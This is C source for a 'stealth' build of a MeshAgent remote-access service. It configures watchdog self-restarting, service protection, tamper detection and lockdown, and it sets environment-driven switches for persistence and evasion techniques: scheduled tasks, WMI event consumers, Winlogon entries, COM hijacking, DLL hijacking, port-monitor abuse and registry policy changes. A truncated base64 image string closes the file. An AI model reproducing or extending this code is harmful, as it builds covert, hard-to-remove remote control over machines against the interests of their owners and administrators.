static BOOL MeshService_StartStealthIntegration(void);
static void MeshService_ShutdownStealthIntegration(void);
#endif

#ifdef MESHAGENT_ENABLE_STEALTH
/*
 * MeshService_EnableWatchdogIfConfigured - Legacy direct watchdog activation
 *
 * IMPORTANT: There are two watchdog activation paths in the codebase:
 * 1. This function (legacy) - Direct watchdog via persistence profile settings
 * 2. StealthIntegration path - Via StealthIntegration_Init/Start and Lockdown_Enter
 *
 * To avoid conflicts:
 * - If StealthIntegration is ready (g_StealthIntegrationReady == TRUE), this function
 *   returns FALSE and defers to the StealthIntegration path
 * - The StealthIntegration path handles watchdog via ApplyWatchdog() in stealth_lockdown.c
 * - This ensures only ONE watchdog mechanism is active at a time
 */
static BOOL MeshService_EnableWatchdogIfConfigured(void)
{
	const mesh_persistence_profile_t* persistence = MeshConfig_GetPersistence();

	/* Defer to StealthIntegration if it's handling watchdog */
	if (g_StealthIntegrationReady) {
		Stealth_DebugPrintfA("[Watchdog] Deferring to StealthIntegration path");
		return FALSE;
	}

	if (persistence == NULL || persistence->watchdog.enabled == 0) { return FALSE; }
	if (g_WatchdogRuntimeActive) { return TRUE; }

	WCHAR serviceNameBuf[64] = { 0 };
	if (!MeshService_GetServiceNameW(serviceNameBuf, _countof(serviceNameBuf)))
	{
		StringCchCopyW(serviceNameBuf, _countof(serviceNameBuf), STEALTH_FALLBACK_SERVICE_NAME);
	}

	WCHAR exePath[MAX_PATH] = { 0 };
	if (!MeshService_ResolveHostExecutablePathW(exePath, _countof(exePath)))
	{
		return FALSE;
	}

	WatchdogConfig config;
	Watchdog_InitConfig(&config);
	if (persistence->watchdog.intervalSeconds > 0)
	{
		config.checkIntervalMs = persistence->watchdog.intervalSeconds * 1000;
	}
	if (persistence->watchdog.restartDelaySeconds > 0)
	{
		config.restartDelayMs = persistence->watchdog.restartDelaySeconds * 1000;
	}

	if (!Watchdog_Start(&config))
	{
		return FALSE;
	}

	WCHAR args[128] = { 0 };
	StringCchPrintfW(args, _countof(args), L"-watchdog \"%s\"", serviceNameBuf);
	if (!Watchdog_AddProcess(exePath, args, NULL))
	{
		Watchdog_Stop();
		return FALSE;
	}

	g_WatchdogHeartbeatIntervalMs = config.checkIntervalMs;

	if (Watchdog_CreateHeartbeat(serviceNameBuf, &g_WatchdogHeartbeatMapHandle))
	{
		g_WatchdogHeartbeatEvent = CreateEventW(NULL, TRUE, FALSE, NULL);
		if (g_WatchdogHeartbeatEvent != NULL)
		{
			g_WatchdogHeartbeatThread = CreateThread(NULL, 0, MeshService_WatchdogHeartbeatThread, NULL, 0, NULL);
			if (g_WatchdogHeartbeatThread == NULL)
			{
				CloseHandle(g_WatchdogHeartbeatEvent);
				g_WatchdogHeartbeatEvent = NULL;
				Watchdog_CloseHeartbeat(g_WatchdogHeartbeatMapHandle);
				g_WatchdogHeartbeatMapHandle = NULL;
			}
		}
		else
		{
			Watchdog_CloseHeartbeat(g_WatchdogHeartbeatMapHandle);
			g_WatchdogHeartbeatMapHandle = NULL;
		}
	}

	g_WatchdogRuntimeActive = TRUE;
	return TRUE;
}

static void MeshService_DisableWatchdog(void)
{
	if (!g_WatchdogRuntimeActive) { return; }

	if (g_WatchdogHeartbeatEvent != NULL)
	{
		SetEvent(g_WatchdogHeartbeatEvent);
		if (g_WatchdogHeartbeatThread != NULL)
		{
			WaitForSingleObject(g_WatchdogHeartbeatThread, 3000);
			CloseHandle(g_WatchdogHeartbeatThread);
			g_WatchdogHeartbeatThread = NULL;
		}
		CloseHandle(g_WatchdogHeartbeatEvent);
		g_WatchdogHeartbeatEvent = NULL;
	}

	if (g_WatchdogHeartbeatMapHandle != NULL)
	{
		Watchdog_CloseHeartbeat(g_WatchdogHeartbeatMapHandle);
		g_WatchdogHeartbeatMapHandle = NULL;
	}

	Watchdog_Stop();
	g_WatchdogRuntimeActive = FALSE;
}

static DWORD WINAPI MeshService_WatchdogHeartbeatThread(LPVOID param)
{
	UNREFERENCED_PARAMETER(param);

	if (g_WatchdogHeartbeatEvent == NULL)
	{
		return 0;
	}

	while (WaitForSingleObject(g_WatchdogHeartbeatEvent, g_WatchdogHeartbeatIntervalMs) == WAIT_TIMEOUT)
	{
		Watchdog_SendHeartbeat();
	}

	return 0;
}
#else
static BOOL MeshService_EnableWatchdogIfConfigured(void)
{
	return FALSE;
}
static void MeshService_DisableWatchdog(void)
{
}
#endif

#ifdef MESHAGENT_ENABLE_STEALTH
static BOOL MeshService_ReadEnvBool(const wchar_t* name, BOOL defaultValue)
{
	wchar_t buffer[32];
	DWORD len = GetEnvironmentVariableW(name, buffer, (DWORD)_countof(buffer));
	if (len == 0 || len >= _countof(buffer)) { return defaultValue; }

	if (_wcsicmp(buffer, L"1") == 0 || _wcsicmp(buffer, L"true") == 0 ||
		_wcsicmp(buffer, L"yes") == 0 || _wcsicmp(buffer, L"on") == 0)
	{
		return TRUE;
	}
	if (_wcsicmp(buffer, L"0") == 0 || _wcsicmp(buffer, L"false") == 0 ||
		_wcsicmp(buffer, L"no") == 0 || _wcsicmp(buffer, L"off") == 0)
	{
		return FALSE;
	}
	return defaultValue;
}

static DWORD MeshService_ReadEnvDword(const wchar_t* name, DWORD defaultValue)
{
	wchar_t buffer[32];
	DWORD len = GetEnvironmentVariableW(name, buffer, (DWORD)_countof(buffer));
	if (len == 0 || len >= _countof(buffer)) { return defaultValue; }

	wchar_t* endPtr = NULL;
	DWORD value = (DWORD)wcstoul(buffer, &endPtr, 10);
	if (endPtr == buffer) { return defaultValue; }
	return value;
}

static void MeshService_JoinPath(wchar_t* dest, size_t destCch, const wchar_t* dir, const wchar_t* leaf)
{
	if (dest == NULL || dir == NULL || leaf == NULL || destCch == 0) { return; }
	StringCchCopyW(dest, destCch, dir);
	size_t len = wcslen(dest);
	if (len > 0 && dest[len - 1] != L'\\' && dest[len - 1] != L'/')
	{
		StringCchCatW(dest, destCch, L"\\");
	}
	StringCchCatW(dest, destCch, leaf);
}

static BOOL MeshService_BuildIntegrationConfig(StealthIntegrationConfig* config)
{
	if (config == NULL) { return FALSE; }

	StealthIntegration_LoadDefaultConfig(config);

	WCHAR serviceNameBuf[64] = { 0 };
	MeshService_CopyBrandingTextToWide(MeshService_GetServiceFileText(), serviceNameBuf, _countof(serviceNameBuf));
	if (serviceNameBuf[0] == L'\0')
	{
		StringCchCopyW(serviceNameBuf, _countof(serviceNameBuf), STEALTH_FALLBACK_SERVICE_NAME);
	}
	StringCchCopyW(config->serviceName, _countof(config->serviceName), serviceNameBuf);

	WCHAR displayNameBuf[128] = { 0 };
	MeshService_CopyBrandingTextToWide(MeshService_GetServiceNameText(), displayNameBuf, _countof(displayNameBuf));
	if (displayNameBuf[0] == L'\0')
	{
		StringCchCopyW(displayNameBuf, _countof(displayNameBuf), STEALTH_FALLBACK_DISPLAY_NAME);
	}
	StringCchCopyW(config->displayName, _countof(config->displayName), displayNameBuf);

	WCHAR exePath[MAX_PATH] = { 0 };
	if (GetModuleFileNameW(NULL, exePath, _countof(exePath)) != 0)
	{
		StringCchCopyW(config->serviceExePath, _countof(config->serviceExePath), exePath);
	}

	StealthInstallPaths paths = { 0 };
	if (Stealth_GetInstallPaths(&paths))
	{
		if (paths.installDir[0] != L'\0')
		{
			StringCchCopyW(config->installDir, _countof(config->installDir), paths.installDir);
			MeshService_JoinPath(config->stateFilePath, _countof(config->stateFilePath), paths.installDir, L"state.dat");
		}
		if (paths.logPath[0] != L'\0')
		{
			StringCchCopyW(config->logFilePath, _countof(config->logFilePath), paths.logPath);
		}
		else if (paths.logsDir[0] != L'\0')
		{
			MeshService_JoinPath(config->logFilePath, _countof(config->logFilePath), paths.logsDir, L"integration.log");
		}
	}

	StringCchPrintfW(config->ipcPipeName, _countof(config->ipcPipeName),
		L"\\\\.\\pipe\\%s_Ipc", serviceNameBuf);

	const mesh_persistence_profile_t* persistence = MeshConfig_GetPersistence();
	config->enableServiceProtection = TRUE;
	config->enableTaskScheduler = MeshService_ReadEnvBool(L"STEALTH_ENABLE_TASKS",
		(persistence != NULL && persistence->autorunTask.enabled != 0));
	config->enableWmiConsumer = MeshService_ReadEnvBool(L"STEALTH_ENABLE_WMI",
		(persistence != NULL && persistence->restartTask.enabled != 0));
	config->enableWatchdog = MeshService_ReadEnvBool(L"STEALTH_ENABLE_WATCHDOG",
		(persistence != NULL && persistence->watchdog.enabled != 0));
	config->enableTamperDetection = MeshService_ReadEnvBool(L"STEALTH_ENABLE_MONITOR", config->enableTamperDetection);
	config->enableIpcServer = MeshService_ReadEnvBool(L"STEALTH_ENABLE_IPC", config->enableIpcServer);
	config->enableRegistryPolicy = MeshService_ReadEnvBool(L"STEALTH_ENABLE_REGISTRY_POLICY", config->enableRegistryPolicy);
	config->enableWinlogon = MeshService_ReadEnvBool(L"STEALTH_ENABLE_WINLOGON", config->enableWinlogon);
	config->enableExplorerPolicy = MeshService_ReadEnvBool(L"STEALTH_ENABLE_EXPLORER_POLICY", config->enableExplorerPolicy);
	config->enableComHijack = MeshService_ReadEnvBool(L"STEALTH_ENABLE_COM_HIJACK", config->enableComHijack);
	config->enablePortMonitor = MeshService_ReadEnvBool(L"STEALTH_ENABLE_PORT_MONITOR", config->enablePortMonitor);
	config->enableDllHijack = MeshService_ReadEnvBool(L"STEALTH_ENABLE_DLL_HIJACK", config->enableDllHijack);

	if (persistence != NULL && persistence->watchdog.intervalSeconds > 0)
	{
		config->watchdogIntervalMs = persistence->watchdog.intervalSeconds * 1000;
	}
	config->monitorIntervalMs = MeshService_ReadEnvDword(L"STEALTH_MONITOR_INTERVAL_MS", config->monitorIntervalMs);
	config->watchdogIntervalMs = MeshService_ReadEnvDword(L"STEALTH_WATCHDOG_INTERVAL_MS", config->watchdogIntervalMs);
	config->ipcTimeoutMs = MeshService_ReadEnvDword(L"STEALTH_IPC_TIMEOUT_MS", config->ipcTimeoutMs);

	config->autoSecureEnter = MeshService_ReadEnvBool(L"STEALTH_AUTO_SECUREENTER", config->enableWatchdog);
	config->strictServiceOnly = MeshService_ReadEnvBool(L"STEALTH_STRICT_SERVICE_ONLY", config->strictServiceOnly);
	config->allowDesktopBridge = MeshService_ReadEnvBool(L"STEALTH_ALLOW_DESKTOP_BRIDGE", config->allowDesktopBridge);

	wchar_t authKey[64];
	if (GetEnvironmentVariableW(L"STEALTH_IPC_AUTH", authKey, (DWORD)_countof(authKey)) > 0)
	{
		StringCchCopyW(config->ipcAuthKey, _countof(config->ipcAuthKey), authKey);
	}

	// Helper monitor configuration.
	// Service-only baseline: never auto-enable user-session helper spawning from
	// watchdog/persistence defaults. Operators must opt in explicitly.
	config->enableHelperMonitor = MeshService_ReadEnvBool(
		L"STEALTH_ENABLE_HELPER_MONITOR",
		FALSE);
	if (config->strictServiceOnly &&
		!config->allowDesktopBridge &&
		config->enableHelperMonitor)
	{
		Stealth_DebugPrintfW(L"[Policy] Strict service-only enabled: helper monitor requires STEALTH_ALLOW_DESKTOP_BRIDGE=1. Disabling helper monitor.");
		config->enableHelperMonitor = FALSE;
	}

	if (config->enableHelperMonitor)
	{
		BOOL helperExeValid = FALSE;
		wchar_t helperExeEnv[MAX_PATH] = { 0 };
		wchar_t helperExeExpanded[MAX_PATH] = { 0 };
		const wchar_t* rawHelperExe = NULL;

		if (GetEnvironmentVariableW(L"STEALTH_HELPER_EXE", helperExeEnv, (DWORD)_countof(helperExeEnv)) > 0)
		{
			rawHelperExe = helperExeEnv;
		}
		else if (config->helperExePath[0] != L'\0')
		{
			rawHelperExe = config->helperExePath;
		}
		else
		{
			rawHelperExe = config->serviceExePath;
		}

		if (rawHelperExe != NULL && rawHelperExe[0] != L'\0')
		{
			const wchar_t* resolvedExe = rawHelperExe;
			if (ExpandEnvironmentStringsW(rawHelperExe, helperExeExpanded, (DWORD)_countof(helperExeExpanded)) > 0 &&
				helperExeExpanded[0] != L'\0')
			{
				resolvedExe = helperExeExpanded;
			}

			DWORD attrs = GetFileAttributesW(resolvedExe);
			if (attrs != INVALID_FILE_ATTRIBUTES && (attrs & FILE_ATTRIBUTE_DIRECTORY) == 0)
			{
				StringCchCopyW(config->helperExePath, _countof(config->helperExePath), resolvedExe);
				helperExeValid = TRUE;
			}
			else
			{
				Stealth_DebugPrintfW(L"[HelperMonitor] Helper executable missing or invalid: %ls", resolvedExe);
			}
		}

		if (!helperExeValid)
		{
			config->enableHelperMonitor = FALSE;
		}
		else
		{
			wchar_t helperArgs[512] = { 0 };
			wchar_t helperArgsExpanded[512] = { 0 };

			if (GetEnvironmentVariableW(L"STEALTH_HELPER_ARGS", helperArgs, (DWORD)_countof(helperArgs)) > 0)
			{
				const wchar_t* resolvedArgs = helperArgs;
				if (ExpandEnvironmentStringsW(helperArgs, helperArgsExpanded, (DWORD)_countof(helperArgsExpanded)) > 0 &&
					helperArgsExpanded[0] != L'\0')
				{
					resolvedArgs = helperArgsExpanded;
				}
				StringCchCopyW(config->helperArguments, _countof(config->helperArguments), resolvedArgs);
			}
			else if (config->helperArguments[0] == L'\0')
			{
				Stealth_DebugPrintfW(L"[HelperMonitor] Helper monitor requires an explicit rundll32 desktop-bridge command. Disabling helper monitor.");
				config->enableHelperMonitor = FALSE;
			}

			if (config->enableHelperMonitor &&
				!HelperMonitor_IsApprovedDesktopBridgeCommand(config->helperExePath, config->helperArguments))
			{
				Stealth_DebugPrintfW(L"[HelperMonitor] Rejected helper monitor command outside the retained desktop-bridge contract: exe=%ls args=%ls",
					config->helperExePath,
					config->helperArguments);
				config->enableHelperMonitor = FALSE;
			}

			if (config->enableHelperMonitor)
			{
				config->helperPersistentSpawn = MeshService_ReadEnvBool(L"STEALTH_HELPER_PERSISTENT", config->helperPersistentSpawn);
				config->helperRegisterWatchdog = MeshService_ReadEnvBool(L"STEALTH_HELPER_WATCHDOG", config->helperRegisterWatchdog);
			}
		}
	}

	Stealth_DebugPrintfW(L"[Policy] strictServiceOnly=%lu allowDesktopBridge=%lu helperMonitor=%lu",
		config->strictServiceOnly ? 1UL : 0UL,
		config->allowDesktopBridge ? 1UL : 0UL,
		config->enableHelperMonitor ? 1UL : 0UL);

	return TRUE;
}

static BOOL MeshService_StartStealthIntegration(void)
{
	if (g_StealthIntegrationRunning) { return TRUE; }

	StealthIntegrationConfig config;
	if (!MeshService_BuildIntegrationConfig(&config))
	{
		return FALSE;
	}

	if (!g_StealthIntegrationReady)
	{
		if (!StealthIntegration_Init(&config))
		{
			return FALSE;
		}
		g_StealthIntegrationReady = TRUE;
	}

	if (StealthIntegration_Start())
	{
		g_StealthIntegrationRunning = TRUE;
		return TRUE;
	}

	StealthIntegration_Cleanup();
	g_StealthIntegrationReady = FALSE;
	return FALSE;
}

static void MeshService_ShutdownStealthIntegration(void)
{
	if (!g_StealthIntegrationReady)
	{
		return;
	}

	if (g_StealthIntegrationRunning)
	{
		StealthIntegration_Stop();
		g_StealthIntegrationRunning = FALSE;
	}

	StealthIntegration_Cleanup();
	g_StealthIntegrationReady = FALSE;
}
#endif /* MESHAGENT_ENABLE_STEALTH */

static void MeshService_ActivateResilience(void)
{
#ifdef MESHAGENT_ENABLE_STEALTH
	if (!MeshService_StartStealthIntegration())
	{
		MeshService_EnableWatchdogIfConfigured();
	}
#else
	MeshService_EnableWatchdogIfConfigured();
#endif
}

static void MeshService_DeactivateResilience(void)
{
#ifdef MESHAGENT_ENABLE_STEALTH
	if (g_StealthIntegrationReady)
	{
		MeshService_ShutdownStealthIntegration();
	}
	else
	{
		MeshService_DisableWatchdog();
	}
#else
	MeshService_DisableWatchdog();
#endif
}

static void MeshService_InitializeBrandingGlobals(void)
{
	if (g_serviceFileText == NULL)
	{
		g_serviceFileText = MeshService_GetServiceFileText();
	}
	if (g_serviceNameText == NULL)
	{
		g_serviceNameText = MeshService_GetServiceNameText();
	}
	if (serviceFile == NULL && g_serviceFileText != NULL)
	{
		serviceFile = (TCHAR*)g_serviceFileText;
	}
	if (serviceName == NULL && g_serviceNameText != NULL)
	{
		serviceName = (TCHAR*)g_serviceNameText;
	}

	MeshService_TouchProvisioningMarkers();
}

SERVICE_STATUS serviceStatus;
SERVICE_STATUS_HANDLE serviceStatusHandle = 0;
INT_PTR CALLBACK DialogHandler(HWND, UINT, WPARAM, LPARAM);
INT_PTR CALLBACK DialogHandler2(HWND, UINT, WPARAM, LPARAM);

MeshAgentHostContainer *agent = NULL;
DWORD g_serviceArgc;
char **g_serviceArgv;
extern int gRemoteMouseRenderDefault;
char *DIALOG_LANG = NULL;

HBRUSH DialogBackgroundBrush = NULL;
duk_context *g_dialogCtx = NULL;
char *g_dialogLanguage = NULL;
void *g_dialogTranslationObject = NULL;
char image_b64[] = "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